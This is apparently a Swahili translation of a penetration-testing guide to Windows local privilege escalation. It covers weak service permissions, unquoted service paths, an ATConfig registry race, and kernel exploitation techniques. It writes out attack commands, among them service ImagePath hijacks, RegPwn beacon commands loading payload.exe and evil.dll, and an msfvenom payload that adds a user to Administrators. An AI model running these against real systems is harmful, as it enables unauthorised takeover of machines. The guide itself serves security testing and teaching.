- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa kutambua na kutumia athari hii, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za binary za services

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye mamlaka ya juu, lakini **watumiaji wenye haki ndogo wanaweza kurekebisha EXE ya service au folda yake kuu**, mara nyingi service inaweza kutekwa **kwa kubadilisha binary na kuwasha upya service**.

**Angalia kama unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda** ambamo binary hiyo iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayoendeshwa na service kwa kutumia **wmic** (si katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizotolewa kwa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya service au kwenye directory iliyo nayo. Mtiririko wa vitendo wa kutumia vibaya ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya service na njia ya executable kwa kutumia `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa kutumia `icacls <path>`.
3. Badilisha binary ya service na payload au binary halali ya service hasidi.
4. Anzisha upya service kwa kutumia `sc stop <service_name> && sc start <service_name>` (au subiri kompyuta iwashwe upya / kichochezi cha service).

Ukaguzi muhimu wa kiotomatiki:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa service hairuhusu user wa kawaida kuianzisha upya, angalia kama inaanza kiotomatiki wakati wa boot, ina failure action inayoianzisha tena, au inaweza kuwashwa kwa njia isiyo ya moja kwa moja na application inayoitumia.

### Ruhusa za kurekebisha registry ya Services

Unapaswa kuangalia kama unaweza kurekebisha registry yoyote ya service.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya service kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Jaribio la awali la ruhusa lilielezwa hivi:

Inapaswa kuchunguzwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Kagua kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za registry zinazowezesha kuandika kwenye key maalum ya service. Ingizo la ACL pekee halithibitishi ufikiaji halisi: ingizo za deny, token ya sasa, na ruhusa zilizorithiwa ni muhimu. Ruhusa za registry-key ni tofauti na ruhusa za service object za `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Escalation pia inahitaji sehemu ya configuration ya service inayoweza kutumika, njia ya kuanzisha service, na service identity yenye ruhusa za juu zaidi. Tazama [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) na [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) za Microsoft.

Kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Mashindano ya registry symlink kwa kuandika thamani yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda funguo za **ATConfig** kwa kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** hadi kwenye ufunguo wa session wa HKLM. **Race ya symbolic link** ya registry inaweza kuelekeza uandishi huo wenye privilage hadi kwenye **njia yoyote ya HKLM**, na kuwezesha primitive ya kuandika **thamani yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo muhimu (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya Accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure-desktop na mtumiaji anaweza kuiandikia.

Mtiririko wa kutumia vibaya (CVE-2026-24291 / ATConfig):

1. Jaza thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha nakala ya secure-desktop (kwa mfano, **LockWorkstation**), ambayo huanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapoanzishwa, badilisha ufunguo wa **HKLM Session ATConfig** uwe **registry link** inayoelekeza kwenye target ya HKLM iliyolindwa.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyoelekezwa.

Ukiwa na uwezo wa kuandika thamani yoyote ya HKLM, elekeza shambulizi kwenye LPE kwa kubadilisha thamani za usanidi wa service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) na uiwashe baada ya uandishi. **Dokezo:** utekelezaji wa public exploit **hufunga workstation** kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Ruhusa za AppendData/AddSubdirectory kwenye registry ya Services

Ukiwa na ruhusa hii kwenye registry, inamaanisha **unaweza kuunda sub registries kutoka kwenye hii**. Kwa services za Windows, hii **inatosha kutekeleza msimbo wowote**:

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haijawekwa ndani ya alama za nukuu, Windows itajaribu kutekeleza kila sehemu ya path inayoishia kabla ya nafasi.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma ambazo hazijafungwa kwa alama za kunukuu, isipokuwa zile za huduma za Windows zilizojengewa ndani:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na ku-exploit** udhaifu huu kwa kutumia metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda mwenyewe binary ya service kwa kutumia metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Vitendo vya Urejeshaji

Windows huruhusu watumiaji kubainisha hatua zitakazochukuliwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hiyo inaweza kubadilishwa, huenda ikawa rahisi kufanya privilege escalation. Maelezo zaidi yanapatikana katika [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Faili za script zinazolengwa na scheduled task

Kwa task iliyowezeshwa inayoendesha `cmd.exe /c` na faili ya `.bat` au `.cmd`, kagua faili ya script iliyotajwa kwenye **action arguments** pamoja na `cmd.exe`. Hali hiyo hiyo inatumika kwa hoja ya faili iliyo wazi ya interpreter, kama PowerShell `-File`. Ikiwa scheduled batch file ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script inayorejelewa; variables, conditionals, na uunganishaji wa shell huhitaji ufuatiliaji wa mikono. Script au parent directory inayoweza kuandikwa na mwitaji ni kidokezo cha utekelezaji kati ya akaunti tofauti iwapo tu principal iliyosanidiwa kwa task ni tofauti na mwitaji na task inafikia action hiyo. ACL ya append-only inaweza kuwa muhimu kwa scripts, lakini `exit` ya awali au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikike. Thibitisha ACL zinazotumika, [muktadha wa utekelezaji wa task](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger, na sera ya udhibiti wa programu kabla ya kudai kuwa privilege escalation inawezekana. Orodhesha bila kubadilisha script au kuanzisha task.

## Streams zenye majina kwenye faili zinazoweza kufikiwa

Kwenye NTFS, faili inayosomeka inaweza kuwa na stream ya `:$DATA` yenye jina, ambayo maudhui yake hayaonyeshwi kwenye orodha ya kawaida ya directory. Kwa seti ndogo na husika ya faili za backup au usanidi zinazoweza kufikiwa, kagua **majina na ukubwa** wa stream kabla ya kufungua maudhui yoyote; Windows huzionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la stream linalodokeza kuwepo kwa siri ni kidokezo tu. Kagua ruhusa halisi ya kusoma faili, usaidizi wa stream wa filesystem, iwapo stream ina credentials zinazoweza kutumika, na akaunti ambazo credentials hizo huithibitisha kwa kweli. Epuka kuchanganua streams kwa kujirudia na kuchapisha maudhui yake wakati wa kuorodhesha kwa kawaida.

## Ingizo za helper za Windows Driver Kit zinazoendeshwa na scheduled task

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia faili za `command.txt`, `reboot.rsf`, na project `working\rsf.rsf` kutoka kwenye run directory yake. Scheduled task au service inayoanzisha helper hii kwa akaunti yenye privileged inaweza kubadilisha ruhusa ya kiwango cha chini ya kuandika kwenye ingizo hizo kuwa utekelezaji wa command katika muktadha wa akaunti hiyo, hata kama executable ya helper yenyewe imelindwa. Thibitisha kuwa kuna mtumiaji privileged anayezitumia na kwamba **faili zote mbili** za sidecar zinaweza kuundwa au kurekebishwa; kupata helper pekee hakutoshi.

Kwa scheduled task, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya action yake na ACL za njia mbili za sidecar. Ikiwa task haijabainisha working directory, directory ya executable ni kidokezo tu cha kuthibitisha, si uthibitisho wa mahali task inaposoma ingizo zake. Sharti la project working-file lazima pia litimizwe. Kagua principal halisi ya task badala ya kudhani kuwa inaendeshwa kama SYSTEM.

## Programu

### Programu Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda ukaweza kubadilisha moja na kuongeza privileges) na za **folders** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya ukarabati wa Windows agent ya Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri Windows agent za zamani za Checkmk ambazo ziliandika command files katika `C:\Windows\Temp` kisha kutekeleza faili iliyokuwepo awali na iliyolindwa dhidi ya kuandikwa baada ya jaribio la kuibadilisha kushindwa. Vendor alirekebisha tatizo hili katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na iwapo operesheni iliyoathiriwa ya agent inaweza kuendeshwa; lebo ya branch pekee kama `2.1` haiwezi kuthibitisha kuwa mfumo uko hatarini. Enumeration inaweza kukagua version, hali ya service, na ruhusa za Temp bila kuunda faili au kuwasha command za agent.

#### Ukaguzi wa SAML service ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri build 6210 na za awali za ADSelfService Plus; vendor aliirekebisha katika build 6211. Inahusika tu ikiwa SAML SSO **imewezeshwa au iliwahi kuwezeshwa**. Kwa hiyo, ingizo la bidhaa iliyosakinishwa au service path ni kidokezo tu, si uamuzi wa kuwepo kwa vulnerability: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na akaunti inayoendesha service hiyo. Code execution kupitia service hutumia privileges za akaunti hiyo; utekelezaji wa SYSTEM unahitaji instance inayoendeshwa kama SYSTEM. `OfflineBackup_*.ezip` inayoweza kusomwa katika directory ya Backup ya bidhaa ni kidokezo tofauti cha encrypted backup, si ushahidi wa credential inayoweza kutumika au dosari hii ya SAML. Rekodi path na access rights zake bila kuifungua wakati wa routine enumeration.

#### Jenkins controller na mipaka ya domain account

Kwenye Windows Jenkins controller, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuianzisha: [Jenkins inaeleza hizi kama haki tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuanzisha build, lakini thibitisha kuwa imewezeshwa na build inaendeshwa kweli. Utekelezaji hutumia identity ya controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi credential material na encryption keys katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwao pekee hakufichui password; thibitisha **read access ya faili zinazohitajika** na njia tofauti ya kutumia tena akaunti, bila kuchapisha secrets kwenye matokeo yanayoshirikiwa. Ikiwa akaunti hiyo ina ruhusa ya kuandika `scriptPath` ya AD user-object, thibitisha kuwa script path inaweza kuandikwa na kuna logon halisi au scheduled consumer inayoendeshwa kama mtumiaji lengwa kabla ya kuichukulia kama utekelezaji wa kuvuka akaunti. Udhibiti zaidi kupitia group unahitaji kuthibitisha kando effective AD rights.

#### Identity ya Azure Pipelines self-hosted agent

Kwa mradi wa Azure DevOps Server au Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuipanga foleni** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa akaunti yenye privileges za chini inaweza kuwasilisha script step na kuendesha pipeline hiyo kwenye self-hosted Windows agent, step huendeshwa kama [akaunti ya mfumo wa uendeshaji iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline halisi, vikwazo vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na identity ya agent service kabla ya kudai kuna mpito wa kuvuka akaunti au kwenda SYSTEM. Agent iliyosakinishwa, role ya mradi, au ruhusa ya kuandika kwenye repository ni vidokezo tu; kagua ruhusa na metadata ya local service bila kuanzisha build wakati wa passive enumeration.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft hutofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync service account**, inayoendesha synchronization service na kufikia SQL database yake, na **AD DS connector account**, ambayo ruhusa zake za directory hutegemea vipengele vya sync vilivyosaniwa. Connector credentials huhifadhiwa zikiwa encrypted katika database hiyo, na key material [hulindwa na DPAPI chini ya ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sync service iliyosakinishwa, group inayoonekana kuwa ya local administrator, au uwezo wa kuona database pekee havithibitishi credential inayoweza kufunguliwa au kupandisha privileges kwenye domain. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa service account/key, mpangilio wa usakinishaji na SQL, connector identity iliyosanidiwa, na effective AD privileges za identity hiyo. Routine enumeration inapaswa kuonyesha metadata ya service na ufikiaji pekee, si kuuliza au kuchapisha secrets zilizohifadhiwa.

#### Ruhusa za Printer driver support DLL

Printer driver iliyosakinishwa inaweza kuhifadhi support DLLs chini ya `C:\ProgramData` na kuzibeba katika print process yenye privileges za juu zaidi. Kagua directory halisi ya driver na ACLs za DLL, ikijumuisha parent directories na reparse points, hata kama printer WMI enumeration imekataliwa. Kwa [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), path iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza kupakiwa kwa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu kuandika ni kidokezo tu: thibitisha effective write access baada ya deny entries, kuwa driver husika imesakinishwa na inabeba faili chini ya identity yenye privileges za juu, na iwapo driver iliyosasishwa au security program ya vendor imerekebisha usakinishaji. Usihitimishe kuwa kuna vulnerability kutokana na jina la directory au version ya driver pekee.

### Ruhusa za Kuandika

Angalia kama unaweza kurekebisha config file ili kusoma faili fulani maalum au kama unaweza kurekebisha binary itakayoendeshwa na akaunti ya Administrator (schedtasks).

Njia mojawapo ya kutafuta ruhusa dhaifu za folder/files kwenye mfumo ni kufanya hivi:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo ndani ya folda zake ndogo za `plugins`. Ikiwa kuna usakinishaji wa portable/nakala unaoweza kuandikwa, kuweka plugin hasidi husababisha utekelezaji wa msimbo kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kutoka `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Kuendesha wakati wa kuanzisha mfumo

**Angalia kama unaweza kubadilisha registry au binary inayotekelezwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili upate maelezo zaidi kuhusu **maeneo ya autoruns yanayoweza kutumika kuongeza privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers za wahusika wengine zinazotiliwa shaka/zilizo hatarini kiusalama.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inafichua primitive ya arbitrary kernel read/write (jambo la kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kupandisha privileges kwa kuiba token ya SYSTEM moja kwa moja kutoka kwenye kernel memory.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Nyenzo zinazohusiana na Windows kernel-exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kwa race-condition bugs ambapo call iliyo hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambuliaji, kuchelewesha makusudi utafutaji (kwa kutumia components zenye max-length au minyororo mirefu ya directories) kunaweza kurefusha kipindi kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAFs za cancel-safe queue, ufichuaji wa paged-pool, na I/O ring pivots

Baadhi ya minyororo ya Windows kernel LPE inaweza kujengwa kwa kutumia bugs mbili ambazo kila moja ni dhaifu kivyake: **race ya muda wa maisha wa cancel-safe queue** inayofuta request/CBD wakati queue lock ingali imeshikiliwa, na ufichuaji wa **lock-release-before-copy** unaovujisha allocation iliyofutwa ya paged-pool wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya ukaguzi na exploitation:

- **Free-under-lock + cancel afterwards**: tafuta success path inayofanya **Acquire -> CompleteRequest/free -> Release**, huku cancel path ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa success path inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachilia lock ya CBDQ/CSQ, thread iliyokwama kwenye `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofutwa kwenye remove callback ya driver.
- **Reclaim the freed queue object** kwa allocation ya paged-pool yenye ukubwa sawa, inayodhibitiwa na mshambuliaji. `NPFS` Data Queue Entries zinafaa kwa sababu payload na size zinaweza kudhibitiwa, na baadaye unaweza kuzichunguza kwa pipe read/peek operations. Ikiwa object iliyofutwa ina list links, zibadilishe ziwe **cyclic list ya fake request nodes kwenye user memory**, ili driver ichakate tena na tena request structures zilizofafanuliwa na mshambuliaji badala ya kusimama kwenye list head ya awali.
- **Boresha write inayotabirika**: ikiwa fake request inaelekeza upya nested context pointer inayotumiwa na bookkeeping writes (timestamps / QPC / refcount-adjacent fields), unaweza kupata kernel write inayodhibiti address lakini si value. Katika hali hiyo, lenga field ya **length/size** ya sprayed pool object badala ya final code/data pointer, kisha pitia spray hadi object iliyoharibika iweze kutoa **out-of-bounds paged-pool read**.
- **Muundo wa raceable disclosure**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni mgombea mzuri. Uaminifu huongezeka ikiwa mshambuliaji anaweza kupanua buffer inayokopiwa (kwa mfano kwa kuongeza entries nyingi za list/resource zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu copy ndefu zaidi huongeza muda wa kubadilisha object bila kusababisha mashine ku-crash.
- **Pointer-rich refill targets**: arrays za registered-buffer za Windows **I/O ring** ni targets bora za disclosure kwa sababu ukubwa wao wa paged-pool unaweza kudhibitiwa na mshambuliaji (`8 * regBufferCnt`), na kila element ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Leak moja ya arrays hizi, pata `IORING_OBJECT` inayozizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili I/O ring operations zinazofuata zitumie entries zilizoghushiwa na mshambuliaji na kutoa arbitrary kernel read/write. Ikiwa write pekee inayopatikana inakupa byte isiyobadilika (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kujenga user pointer inayojirudia kwa byte ileile, kama `0x0101010101010101`, imap kwa `VirtualAlloc`, kisha uweke forged registered-buffer array hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Mara tu unapopata arbitrary kernel read/write kupitia corrupted I/O ring, iba SYSTEM token kwa kutumia standard post-primitive workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za memory corruption kwenye Registry hive

Vulnerabilities za kisasa za hive hukuwezesha kupanga deterministic layouts, kutumia descendants zinazoweza kuandikwa za HKLM/HKU vibaya, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze chain kamili hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion ya direct-mode ya `RtlQueryRegistryValues` kupitia njia zinazodhibitiwa na mshambuliaji

Baadhi ya drivers hupokea njia ya registry kutoka userland, huthibitisha tu kuwa ni string halali ya UTF-16, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa kutumia `RTL_QUERY_REGISTRY_DIRECT` kuelekeza matokeo kwenye stack scalar kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hufasiriwa kulingana na aina **halisi** ya registry, si aina ambayo developer alitarajia.

Hii huunda primitives mbili zenye manufaa:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Njia ya absolute `\Registry\...` inayodhibitiwa na mtumiaji huiruhusu driver kuuliza keys zilizochaguliwa na mshambuliaji, kufichua kuwepo kwake kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kuzifikia moja kwa moja.
- **Kernel memory corruption**: Destination ya scalar kama `&readValue` hutafsiriwa kimakosa kama `REG_QWORD`, `UNICODE_STRING`, au sized binary buffer kutegemea aina ya registry value.

Vidokezo vya practical exploitation:

- **Mitigation ya Windows 8+**: Ikiwa query inagusa **untrusted hive** kwa kutumia `RTL_QUERY_REGISTRY_DIRECT` bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili exploitability ibaki, tafuta **keys zinazoweza kuandikwa na mshambuliaji ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Kuweka values kwenye trusted hive**: Tumia NtObjectManager kuorodhesha descendants zinazoweza kuandikwa za `\Registry\Machine`, kisha rudia scan kwa token ya **low-integrity** iliyorudiwa ili kupata keys zinazofikika kutoka kwenye sandboxed contexts:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: uandishi wa moja kwa moja wa baiti 8 kwenye `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na unaweza kufuta kwa sehemu pointer ya callback/function iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` ielekeze kwenye `UNICODE_STRING`. Ikiwa code itapakia kwanza `REG_DWORD` inayodhibitiwa na mshambulizi kwenye scalar ya stack kisha itumie tena buffer hiyo hiyo kusoma string, mshambulizi hudhibiti `Length`/`MaximumLength` na huathiri kwa sehemu pointer ya `Buffer`, hivyo kusababisha uandishi wa kernel unaodhibitiwa kwa kiasi.
